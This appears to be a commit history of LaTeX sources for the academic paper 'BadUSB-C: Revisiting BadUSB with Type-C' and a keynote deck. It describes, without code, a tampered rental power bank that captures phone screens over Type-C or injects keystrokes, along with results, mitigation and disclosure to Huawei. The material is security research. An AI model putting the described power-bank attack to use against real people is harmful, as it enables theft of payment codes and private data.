-for micropayment purchases. For example, WeChat
-Pay~\cite{Wechat-pay} regards transactions under US\textdollar 154 as
-micropayments.  Different from a typical payment procedure, when micropayments
-are made, confirmations can be applied automatically without clients'
-permission which aims to provide convenience to both merchant and client.  If a
-victim's payment code is leaked to the attackers, they can use that code to
-authorize multiple micropayments without needing permission.  In order to prevent such
-cases, both WeChat Pay~\cite{Wechat-pay} and Alipay~\cite{AliPay} have designed a refreshing mechanism for the
-payment code, which is to refresh the QR code every minute. This is sufficient
-to stop an attack like opportunistic theft of a payment code but unable to stop a real-time attack like our
-\tool.  In summary, the payment QR code is highly sensitive on users' devices
-and our following case study is about how to obtain this code using an
-attacker-crafted power bank via \tool.
+Next, we explain a payment method called micropayment.
+A micropayment is pre-determined by the payment service provider according to the threshold in the user agreement.
+In the real world, payment service providers use different rules for micropayment purchases.
+For example, WeChat Pay~\cite{Wechat-pay} treats transactions under US\textdollar 154 as micropayments.
+Different from the typical payment procedure, when marking micropayments, confirmations can be automatically applied without the customer's permission, which aims to provide convenience for both merchant and customer.
+If the victim's payment code is leaked to the attacker, the attacker can use the code to authorize multiple micropayments without permission.
+In order to prevent this situation, both WeChat Pay~\cite{Wechat-pay} and Alipay~\cite{AliPay} have designed a mechanism to refersh the payment code every minute.
+This is sufficient to prevent attacks like opportunistic theft of a payment code, but cannot prevent real-time attacks like our \tool.
+In summary, the QR payment code is highly sensitive on users' devices. Th following case study is about how to use an attacker-crafted power bank via \tool to obtain this code.
 
@@
 
-In this part, we will introduce a real-life attack scenario to show that our
-\tool is a practical offensive tool.  This scenario can be broken down into the
-following steps.
+In this part, we will introduce a real-life attack scenario to show that our \tool is a practical offensive tool.
+This scenario can be broken down into the following steps.
 
@@
 	\item The attacker rents a power bank from one of the power bank stations and replaces the internal components with \tool.
-	\item After the modification, an attacker-crafted power bank is returned to a rental station in a crowded area like an airport or railway station, which increases the probability of success.
-	\item A user borrows the modified power bank and connects it to his/her own device, becoming the victim of \tool.
-	\item The attacker now has complete control over the victim's device and can perform various attacks using different modes.
+	\item After the modification, an attacker-crafted power bank is returned to the rental station in crowded areas like airports or railway stations, which increases the probability of success.
+	\item A user borrows the modified power bank and connects it to his/her own device, becoming a victim of \tool.
+	\item The attacker can now fully control the victim's device and can use different modes for various attacks.
 \end{enumerate}
 
-Next, we summarize the possible threats toward users under different modes.
-%\hongyi{Better way to express this?}
-First, under \ac{HID} emulator mode, the attacker is able to implant malware and backdoor scripts into victims' devices.
-Moreover, using video capture mode, once the victims access their sensitive data such as QR payment  code or photos, their sensitive data could be immediately transmitted via \tool to the attacker.
-Lastly, with full control mode, the attacker has complete control over the victims' devices and could conduct any actions on the victims' devices.
-
-\shuqing{Background is longer than real user study.}
-%As the functionality and effectiveness, HID emulator mode is similar to the original BadUSB and the full control mode hijacks the victim's device completely.
-\hongyi{I dont know if it's a good enough reason}
-%Here we only validate the usability of privacy extraction mode and conducted a user study.
+Next, we summarize the possible threats toward the victim under different modes.
+First, under \ac{HID} emulator mode, the attacker is able to implant malware and backdoor scripts into the victim's device.
+Moreover, using video capture mode, once the victim accesses his/her sensitive data such as QR payment code or photos, the sensitive data will be immediately transmitted to the attacker via \tool.
+Lastly, with full control mode, the attacker can completely control over the victim's device and can perform any operations on the victim's device.
 

### 2021-03-22 WOOT/Files/background.tex

@@
 We first introduce the development of \ac{USB} specification and emphasize the key
-points adopted in this work. We also organized a brief timeline for introducing
+points adopted in this work. We also organize a brief timeline for introducing
 key points of each protocol in Table~\ref{table:usb_timeline}.
@@
 Right after one year of the appearance of \ac{USB} 1.0, a standard named \acf{HID}~\cite{hid} was designed based on \ac{USB}. \ac{HID} is
-designed to unify the implementation for devices like mice,
-keyboards, etc. Before its appearance, the standard is divided among
+designed to unify the implementation for devices like keyboards,
+mice, etc. Before its appearance, the standard is divided among
 manufacturers, for example, the mouse of Company A may use X-Y coordinates to
@@
 In 1998, the first widely supported \ac{USB} protocol was designed. \ac{USB} 1.1~\cite{usb11}
-provided two data transfer rates which are low speed (1.5 Mbit/s) and full
+provides two data transfer rates which are low speed (1.5 Mbit/s) and full
 speed (12 MBit/s). At this point, due to the transfer limitation, it only supports
@@
 In 2000, the \ac{USB} 2.0~\cite{usb20} specification was released. With high speed \mbox{(480
-Mbit/s)} mode introduced, printers, cameras, CD-ROM drives, and network cards were
-supported in this revision. Such a high data transfer rate also gave rise to the
+Mbit/s)} mode introduced, printers, cameras, CD-ROM drives, and network cards are
+supported in this revision. Such a high data transfer rate also give rise to the
 popularity of ``flash drive'', a portable device that allows physically
-transferring data around~\cite{sok}. Although various peripherals were supported
-in \ac{USB} 2.0, there was no reliable way to identify the type of device. This
-security flaw allowed attacks like BadUSB~\cite{badusb,rubber}.
+transferring data around~\cite{sok}. Although various peripherals are supported
+in \ac{USB} 2.0, there is no reliable way to identify the type of device. This
+security flaw allows attacks like BadUSB~\cite{badusb,rubber}.
 
@@
 \ac{USB} 3.0~\cite{usb30} was introduced in 2008, with a super speed \mbox{(5 Gbit/s)} data
-transfer rate. Like its predecessor, more classes of peripherals were supported
+transfer rate. Like its predecessor, more classes of peripherals are supported
 in this revision. In 2013, the \ac{USB} Type-C connector standard was introduced as a
@@
 PowerDelivery, Thunderbolt, DisplayPort, and HDMI.  Yet no improvement of
-security was introduced in 3.x revisions, meaning any device claiming
+security is introduced in 3.x revisions, meaning any device claiming
 itself as a monitor can capture the video stream from the host. Exposing
@@
 pins is halved. Nevertheless, this standard has largely enhanced the capability
-of the \ac{USB} 3.x protocol. As presented in Figure~\ref{fig:usb_c_conn}, Type-C added
-two high-speed data lanes \mbox{(TRX1 \& TRX2)} and kept the original data lane \mbox{(D+ \&
+of the \ac{USB} 3.x protocol. As presented in Figure~\ref{fig:usb_c_conn}, Type-C add
+two high-speed data lanes \mbox{(TRX1 \& TRX2)} and keep the original data lane \mbox{(D+ \&
 D-)}. The added lanes are used exclusively to support peripherals like

### 2021-03-22 WOOT/Files/badusb.tex

@@
 proposed. For example, GoodUSB~\cite{tian2015defending}
-implemented an authorization procedure when a new device is plugged in and blocks other functions except authorized ones.
+implements an authorization procedure when a new device is plugged in and blocks other functions except authorized ones.
 

### 2021-03-22 WOOT/Files/introduction.tex

@@
 modes of \ac{USB} attacks based on our approach to verify its effectiveness,
-including \ac{HID} emulator mode, video capture mode, and full control mode  To improve the
+including \ac{HID} emulation mode, video capture mode, and full control mode  To improve the
 efficiency and performance of \tool, we designed a filtering algorithm to

### 2021-03-22 WOOT/Files/related_work.tex

@@
 a great challenge to the \ac{PnP} property of \ac{USB}, as once it is deployed, it
-stops all \ac{USB} functions other than charging.
+will stop all \ac{USB} functions other than charging.
 
 Under the premise of ensuring the full functionality of \ac{USB} devices, some works
-improve the security while establishing connection. Windows Defender
+improve the security while establishing a connection. Windows Defender
 ATP~\cite{windenfenderwhite} maintains a whitelist of \ac{USB} devices, only devices
@@
 To solve this flaw, GoodUSB~\cite{tian2015defending} reports the functionality claimed
-by the device to the user and lets the user decide whether to authorize. When a device
+by the \ac{USB} device to the user and lets the user decide whether to authorize. When a device
 is plugged in, GoodUSB blocks its functionality before enumeration until a
@@
 interfaces during enumerating, these defenses are sufficient for these attacks.
-Moreover, Mueller \emph{et al.}~\cite{MuellerZN19} improve the security without changing user experience.
+Moreover, Mueller \emph{et al.}~\cite{MuellerZN19} improve the security without changing the user experience.
 It can detect the presence of the user, block malicious devices in the user's absence until the session is unlocked.
@@
 the temporal characteristics of BadUSB-like attacks. This defense mechanism is
-effective because the attacker cannot obtain the screen of the victim host using
+effective because the attacker cannot obtain the screen of the victim's device using
 BadUSB. In this case, the malicious device can only inject keystrokes in a very
@@
 exists an attack called \ac{JFA}~\cite{JFC} which abuses the \ac{MHL}
-standard to steal the video stream from the victim. In order to mitigate this
+standard to steal the video stream from the victim's mobile phone. In order to mitigate this
 issue, Meng et al.~\cite{meng2018252} propose a statistical model using status
@@
 \ac{PnP} property. Although hardware disabling solutions like \ac{USB} Condom
-achieves almost absolute security, the functionality of \ac{USB} is sacrificed.
+achieve almost absolute security, the functionality of \ac{USB} is sacrificed.
 Other solutions like whitelist are either bypassable or insufficient

### 2021-03-22 WOOT/Files/introduction.tex
add missing '.'

--- 2021-03-22 WOOT/Files/introduction.tex
@@
 modes of \ac{USB} attacks based on our approach to verify its effectiveness,
-including \ac{HID} emulator mode, video capture mode, and full control mode  To improve the
+including \ac{HID} emulation mode, video capture mode, and full control mode. To improve the
 efficiency and performance of \tool, we designed a filtering algorithm to

### 2021-03-27 WOOT/BadUSBC.tex
JFA
Add author, minor changes

@@
 
-\author{Anonymous Authors}
-%\author{\IEEEauthorblockN{1\textsuperscript{st} Given Name Surname}
-%\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
-%\textit{name of organization (of Aff.)}\\
-%City, Country \\
-%email address or ORCID}
-%\and
-%\IEEEauthorblockN{2\textsuperscript{nd} Given Name Surname}
-%\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
-%\textit{name of organization (of Aff.)}\\
-%City, Country \\
-%email address or ORCID}
-%\and
-%\IEEEauthorblockN{3\textsuperscript{rd} Given Name Surname}
-%\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
-%\textit{name of organization (of Aff.)}\\
-%City, Country \\
-%email address or ORCID}
-%\and
-%\IEEEauthorblockN{4\textsuperscript{th} Given Name Surname}
-%\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
-%\textit{name of organization (of Aff.)}\\
-%City, Country \\
-%email address or ORCID}
-%\and
-%\IEEEauthorblockN{5\textsuperscript{th} Given Name Surname}
-%\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
-%\textit{name of organization (of Aff.)}\\
-%City, Country \\
-%email address or ORCID}
-%\and
-%\IEEEauthorblockN{6\textsuperscript{th} Given Name Surname}
-%\IEEEauthorblockA{\textit{dept. name of organization (of Aff.)} \\
-%\textit{name of organization (of Aff.)}\\
-%City, Country \\
-%email address or ORCID}
-%}
+\author{\IEEEauthorblockN{Hongyi Lu\textsuperscript{1}\orcidA{}, Yechang Wu\textsuperscript{1}, Shuqing Li\textsuperscript{1}, You Lin\textsuperscript{1}, Chaozu Zhang\textsuperscript{1}, Fengwei Zhang\textsuperscript{1,2}}
+\IEEEauthorblockA{\textsuperscript{1}\textit{Department of Computer Science and Engineering, Southern University of Science and Technology} \\
+		\textsuperscript{2}\textit{Research Institute of Trustworthy Autonomous Systems, Southern University of Science and Technology} \\
+	\{11712009,11711918,lisq2017,11711809,11712021\}@mail.sustech.edu.cn,zhangfw@sustech.edu.cn\\
+}
+}
 
@@
 \newacro{GUI}{Graphical User Interface}
+\newacro{JFA}{Juice Filming Attacks}
 

### 2021-03-27 WOOT/BadUSBC.tex
Authors

@@
 
-\title{\tool: Revisiting BadUSB with Type-C}
+\title{\tool: Revisiting BadUSB with Type-C\\
+\thanks{$^{*}$~The first three authors contributed equally to this work.}
+\thanks{\textsuperscript{\Letter}~Fengwei Zhang is the corresponding author.}}
 
-\author{\IEEEauthorblockN{Hongyi Lu\textsuperscript{1}\orcidA{}, Yechang Wu\textsuperscript{1}, Shuqing Li\textsuperscript{1}, You Lin\textsuperscript{1}, Chaozu Zhang\textsuperscript{1}, Fengwei Zhang\textsuperscript{1,2}}
+\author{\IEEEauthorblockN{Hongyi Lu\textsuperscript{1,*}\orcidA{}, Yechang Wu\textsuperscript{1,*}, Shuqing Li\textsuperscript{1,*}, You Lin\textsuperscript{1}, Chaozu Zhang\textsuperscript{1}, Fengwei Zhang\textsuperscript{1,2,\Letter}}
 \IEEEauthorblockA{\textsuperscript{1}\textit{Department of Computer Science and Engineering, Southern University of Science and Technology} \\

### 2021-04-07 WOOT/BadUSBC.tex
Removal of ORCID

@@
 
-\author{\IEEEauthorblockN{Hongyi Lu\textsuperscript{1,*}\orcidA{}, Yechang Wu\textsuperscript{1,*}, Shuqing Li\textsuperscript{1,*}, You Lin\textsuperscript{1}, Chaozu Zhang\textsuperscript{1}, Fengwei Zhang\textsuperscript{1,2,\Letter}}
+\author{\IEEEauthorblockN{Hongyi Lu\textsuperscript{1,*}, Yechang Wu\textsuperscript{1,*}, Shuqing Li\textsuperscript{1,*}, You Lin\textsuperscript{1}, Chaozu Zhang\textsuperscript{1}, Fengwei Zhang\textsuperscript{1,2,\Letter}}
 \IEEEauthorblockA{\textsuperscript{1}\textit{Department of Computer Science and Engineering, Southern University of Science and Technology} \\

### 2021-04-07 WOOT/Files/introduction.tex
fix typos and edits on intro.

@@
 Conversely, the security of \ac{USB} has caused severe problems.
-Recent research of all USB specifications indicates that security has not been taken into consideration.~\cite{sok}  There are more than 400
+Recent research of all USB specifications indicates that security has not been taken into consideration~\cite{sok}.  There are more than 400
 vulnerabilities related to \ac{USB} on CVE list~\cite{website:CVE-list}.  As a
@@
 extends BadUSB to support the features of \ac{USB} Type-C.
-Although many smartphones equipped with USB-C connectors do not support \ac{USB} 3.x protocol, such as products of Xiaomi, more and more vendors like HUAWEI and Samsung tend to support \ac{USB} 3.x protocol in their \mbox{high-end} smartphones~\cite{usbclist}.
+Although many smartphones equipped with USB-C connectors do not support \ac{USB} 3.x protocol, such as products of Xiaomi, however, vendors like HUAWEI and Samsung tend to support \ac{USB} 3.x protocol in their \mbox{high-end} smartphones~\cite{usbclist}.
 Since \mbox{\ac{USB} Type-C} can transfer video stream data, \tool could obtain the information of the

### 2021-05-28 asss21-keynote/woot.tex
create a folder for asss21 keynote talk.

% !TEX program = xelatex
\documentclass{beamer}
\usetheme{Antibes}
\usepackage{mdframed}
\usepackage{hyperref}
\usepackage{mciteplus}
\usepackage{graphicx}
\usepackage{float}
\usepackage{caption, subcaption}
\usepackage{tabularx}
\usepackage{tikz}
\usepackage{fontspec}
\usepackage[super]{nth}

\setbeamertemplate{footline}[frame number]
\usefonttheme{serif}
\setmainfont{Times New Roman}
\setsansfont{DejaVu Sans}

\definecolor{myblue}{RGB}{91,155,213}
\definecolor{myyellow}{RGB}{237,125,49}
\newcommand{\circled[2]}{
	\tikzset{mystyle/.style={circle,#1,minimum size=10,inner sep=0pt}}
	\tikz[baseline=-3pt]
	{
		\node[mystyle] (char.center) {\vphantom{WAH1g}#2};
	}
}

\title{BadUSB-C: Revisiting BadUSB with Type-C}
\author{\textit{Hongyi Lu}, Yechang Wu, Shuqing Li, You Lin, Chaozu Zhang Fengwei Zhang}
\institute{Southern University of Science and Technology}
\date{\today}
\setcounter{tocdepth}{1}
\begin{document}
\begin{frame}
	\vfill
	\titlepage
	\vfill
\end{frame}
\begin{frame}{Outline}
	\tableofcontents
\end{frame}
\section{Background}
\subsection{USB Protocol}
\begin{frame}{The Ubiquitous Peripheral}
	\begin{figure}[htbp]
		\includegraphics[width=.7\textwidth]{Figs/keyboard.jpg}
		\caption*{HIDs}
	\end{figure}
\end{frame}
\begin{frame}{The Ubiquitous Peripheral}
	\begin{figure}[htbp]
		\includegraphics[width=.7\textwidth]{Figs/powerbank.jpg}
		\caption*{Charging}
	\end{figure}
\end{frame}
\begin{frame}{The Ubiquitous Peripheral}
	\begin{figure}[htbp]
		\includegraphics[width=.7\textwidth]{Figs/flashdrive.jpg}
		\caption*{Data Transfer}
	\end{figure}
\end{frame}
\subsection{Type-C Connector}
\begin{frame}{All in One With Type-C}
\begin{figure}[htbp]
	\includegraphics<1>[width=.8\textwidth]{Figs/messy_cables.png}
	\includegraphics<2>[width=.8\textwidth]{Figs/usbc_top.jpg}
\end{figure}
\end{frame}
\subsection{USB Vulnerabilities}
\begin{frame}{With Great Power Comes Great Responsibility}
	\begin{table}
		\begin{tabular}{c|l|c|c}
			\textbf{Year} & \textbf{Version} & \textbf{Peripherals} & \textbf{Attacks} \\
			1996 & USB 1.x~\cite{usb10,usb11} & Keyboard, Mouse... & BadUSB~\cite{badusb}... \\
			2000 & USB 2.0~\cite{usb20} & Flash Drive, CD Driver... & / \\
			2008 & USB 3.0~\cite{usb30} & /  & / \\
			2013 & USB 3.1~\cite{usb31} &  DisplayPort, ThunderBolt...  & \textbf{BadUSB-C} \\
			2017 & USB 3.2~\cite{usb32} & /  & / \\
		\end{tabular}
		\linebreak
		\caption*{USB Protocol Timeline.}
	\end{table}
\end{frame}
\subsection{Motivations}
\begin{frame}{Traditional BadUSB}
	\begin{figure}[htbp]
		\includegraphics<1>[width=.8\textwidth]{Figs/BadUSB_1.png}
		\includegraphics<2>[width=.8\textwidth]{Figs/BadUSB_2.png}
		\includegraphics<3>[width=.8\textwidth]{Figs/BadUSB_3.png}
		\caption*{Traditional BadUSB Attack.}
	\end{figure}
\end{frame}
\begin{frame}{BadUSB Limitations}
	There are some limitations of the traditional BadUSB attack.
	\begin{itemize}
		\item Cannot perform attack precisely.
		\item Cannot interact with GUI.
		\item Require host network usage.
	\end{itemize}
\end{frame}
\section{Design \& Prototype}
\subsection{Design}
\begin{frame}{Overview}
	\begin{figure}[htbp]
		\centering
		\includegraphics[width=.8\textwidth]{Figs/attack_model.png}
		\begin{tabular}{ll}
			\circled[text=white,fill=myyellow]{\footnotesize{1}} Victim's Devices    &\circled[text=white,fill=myyellow]{\footnotesize{2}}~BadUSB-C\\
			\circled[text=white,fill=myyellow]{\footnotesize{3}} Attacker's Remote PC
		\end{tabular}
	\end{figure}
\end{frame}
\begin{frame}{Video Path}
	\begin{figure}[htbp]
		\centering
		\includegraphics[width=.8\textwidth]{Figs/video_path.png}
		\begin{tabular}{ll}
			\circled[text=white,fill=myyellow]{\footnotesize{1}} Victim's Devices    &\circled[text=white,fill=myyellow]{\footnotesize{2}}~BadUSB-C\\
			\circled[text=white,fill=myyellow]{\footnotesize{3}} Attacker's Remote PC
		\end{tabular}
	\end{figure}
\end{frame}
\begin{frame}{HID Path}
	\begin{figure}[htbp]
		\centering
		\includegraphics[width=.8\textwidth]{Figs/hid_path.png}
		\begin{tabular}{ll}
			\circled[text=white,fill=myyellow]{\footnotesize{1}} Victim's Devices    &\circled[text=white,fill=myyellow]{\footnotesize{2}}~BadUSB-C\\
			\circled[text=white,fill=myyellow]{\footnotesize{3}} Attacker's Remote PC
		\end{tabular}
	\end{figure}
\end{frame}
\begin{frame}{Individual WiFi/GSM}
	\begin{figure}[htbp]
		\centering
		\includegraphics[width=.8\textwidth]{Figs/individual_wifi.png}
		\begin{tabular}{ll}
			\circled[text=white,fill=myyellow]{\footnotesize{1}} Victim's Devices    &\circled[text=white,fill=myyellow]{\footnotesize{2}}~BadUSB-C\\
			\circled[text=white,fill=myyellow]{\footnotesize{3}} Attacker's Remote PC
		\end{tabular}
	\end{figure}
\end{frame}
\subsection{Prototype}
\begin{frame}{Prototype}
	\centering
	\includegraphics[width=.8\textwidth]{Figs/armory_all.png}
		\begin{tabular}{ll}
		\circled[text=white,fill=myblue]{\scriptsize{A}} Victim's Device    &\circled[text=white,fill=myblue]{\scriptsize{B}}~BadUSB-C\\
		\circled[text=white,fill=myblue]{\footnotesize{1}} USB 3.x Hub        &\circled[text=white,fill=myblue]{\footnotesize{2}} Raspberry Pi 4B\\
		\circled[text=white,fill=myblue]{\footnotesize{3}} Auxiliary Power Bank &\circled[text=white,fill=myblue]{\footnotesize{4}} Video Capture\\
		\circled[text=white,fill=myblue]{\footnotesize{5}} ATMEGAA32U4 Board
	\end{tabular}
\end{frame}
\section{Case Study}
\subsection{Background}
\begin{frame}{Sharing Powerbank}
	\begin{figure}[htbp]
		\centering
		\begin{minipage}[t]{0.4\textwidth}
			\centering
			\includegraphics[width=4cm, height=4cm]{Figs/low_power.png}
			\caption*{Low Power}
		\end{minipage}
		\begin{minipage}[t]{0.4\textwidth}
			\centering
			\includegraphics[width=4cm, height=4cm]{Figs/PBS_xd.png}
			\caption*{Sharing Powerbank}
		\end{minipage}
	\end{figure}
\end{frame}
\subsection{Procedure}
\begin{frame}{Typical Attack Procedure}
	\begin{enumerate}
		\item The attacker rents a power bank and replaces the internal components with BadUSB-C.
		\item An attacker-crafted power bank is returned to the rental station in crowded areas.
		\item A user borrows the modified power bank and connects it to his/her own device.
		\item The attacker can now fully control the victim's device.
	\end{enumerate}
\end{frame}
\subsection{Experiment}
\begin{frame}{Experiment Setup}
	We conducted experiment on a HUAWEI P30 Android smartphone. Eleven applications were selected and tested in the following steps:
	\begin{enumerate}
		\item Login in with a test account.
		\item Keep the default settings.
		\item Attach BadUSB-C to the test device.
		\item Simulate victim's daily usage of the application.
	\end{enumerate}
\end{frame}
\begin{frame}{Experiment Screenshots}
	\begin{figure}[htbp]
		\centering
		\begin{minipage}[t]{0.3\textwidth}
			\centering
			\includegraphics[width=\textwidth]{Figs/paypal.png}
		\end{minipage}
		\begin{minipage}[t]{0.3\textwidth}
			\centering
			\includegraphics[width=\textwidth]{Figs/wechat.png}
		\end{minipage}
		\begin{minipage}[t]{0.3\textwidth}
			\centering
			\includegraphics[width=\textwidth]{Figs/twitter.png}
		\end{minipage}
	\end{figure}
\end{frame}
\begin{frame}{Experiment Result}
	\begin{table}[htbp]
		\begin{tabular}{|l|l}
			\textbf{Application}         & \textbf{Leaked Sensitive Information} 		     \\
			WeChat      		         & Financial Status, History, Payment QR Code        \\
			WhatsApp                     & Contacts, Chat History, Phone Number              \\
			Alipay          			 & Financial Status, Payment QR Code                 \\
			Paypal 						 & Paypal Balance      							     \\                              
			Health                       & Personal Health Metrics                           \\
			...                          & ...                                               \\
		\end{tabular}
	\end{table}
\end{frame}
\section{Limitations}
\begin{frame}{Limitations}
	BadUSB-C also has serveral limitations.
	\begin{itemize}
		\item Cannot bypass biometrics authentications like fingerprint.
		\item Requires the DisplayPort over USB Type-C feature to work.
		\item May incur notifications on victim's devices and be discovered.
	\end{itemize}
\end{frame}
\section{Mitigation \& Responsible Disclosure}
\subsection{Mitigation}
\begin{frame}{Isolated UI Rendering}
	\begin{figure}
		\centering
		\includegraphics[width=\linewidth]{Figs/isolated_ui.png}
		\caption*{Isolated UI Rendering}
	\end{figure}
\end{frame}
\subsection{Responsible Disclosure}
\begin{frame}{Responsible Disclosure}
	We contacted HUAWEI after we discovered this vulnerability, who later assigned a CVE entry (CVE-2021-22325) for this vulnerability. 
	\begin{figure}
		\centering
		\includegraphics[width=\linewidth]{Figs/huawei_response.png}
		\caption*{HUAWEI Response}
	\end{figure}
\end{frame}
\begin{frame}{HUAWEI Bug Bounty}
We also applied for the bug bounty program of HUAWEI and gained a reward of over \$4500.
	\begin{figure}
		\centering
		\includegraphics[width=\linewidth]{Figs/bounty.png}
		\caption*{HUAWEI Bug Bounty}
	\end{figure}
\end{frame}
\begin{frame}{Current Mitigation}
	\begin{columns}
		\column{.65\linewidth}
			Now, mitigation for this vulnerability has already been deployed.
			\vspace{1em}

			This mitigation requires user authentication before allowing external USB devices.
		\column{.35\linewidth}
			\begin{figure}
				\includegraphics[width=\columnwidth]{Figs/huawei.png}
			\end{figure}
	\end{columns}
\end{frame}
\section{Conclusion}
\begin{frame}{Conclusion}
	We summarize our work as follows.
	\begin{enumerate}
		\item We explore a new attack scheme leveraging the latest feature of USB protocol.
		\item We conduct real-life scenario study of sharing powerbank to test BadUSB-C efficiency.
		\item We propose novel mitigation for our BadUSB-C attack.
	\end{enumerate}
\end{frame}
\begin{frame}
	\vfill
	\begin{center}
		\Large
		\emph{Thank You!}
	\end{center}
	\vfill
	\usebeamerfont{institute} \url{{11712009,11711918,lisq2017,11711809,11712021}@mail.sustech.edu.cn}
		\\ \url{zhangfw@sustech.edu.cn}
\end{frame}

\begin{frame}[allowframebreaks]
	\bibliographystyle{IEEEtran}
	\bibliography{ref.bib}
\end{frame}
\end{document}

### 2021-05-28 asss21-keynote/main.tex
first version of the keynote

--- 2021-05-28 asss21-keynote/woot.tex
@@
 \setmainfont{Times New Roman}
-\setsansfont{DejaVu Sans}
+%\setsansfont{DejaVu Sans}
 
@@
 
-\title{BadUSB-C: Revisiting BadUSB with Type-C}
-\author{\textit{Hongyi Lu}, Yechang Wu, Shuqing Li, You Lin, Chaozu Zhang Fengwei Zhang}
-\institute{Southern University of Science and Technology}
-\date{\today}
+\title{Keynote: BadUSB-C: Revisiting BadUSB with Type-C}
+
+\author{\textbf{Fengwei Zhang} \\\vspace{3pt}  \includegraphics[width=1.5cm]{name.jpg}}
+\institute{COMPASS Lab, SUSTech\\ \vspace{5pt}
+\includegraphics[width=1.5cm]{sustech-logo.jpeg}}
+%\includegraphics[width=2cm]{logo.png}}
+
+\date{June 7, 2021}
+
 \setcounter{tocdepth}{1}
@@
 \end{frame}
+
 \begin{frame}
-	\vfill
+\frametitle{Thank you!}
 \begin{center}
-		\Large
-		\emph{Thank You!}
+{\huge Questions?}
+\vspace{10pt}
+
+zhangfw@sustech.edu.cn
+\vspace{10pt}
+
+\begin{figure}
+\includegraphics[width=0.25\textwidth]{homepageqrcode.png}
+\end{figure}
+
+\vspace{-10pt}
+\url{http://cse.sustech.edu.cn/faculty/~zhangfw/}
+
 \end{center}
-	\vfill
-	\usebeamerfont{institute} \url{{11712009,11711918,lisq2017,11711809,11712021}@mail.sustech.edu.cn}
-		\\ \url{zhangfw@sustech.edu.cn}
+
 \end{frame}
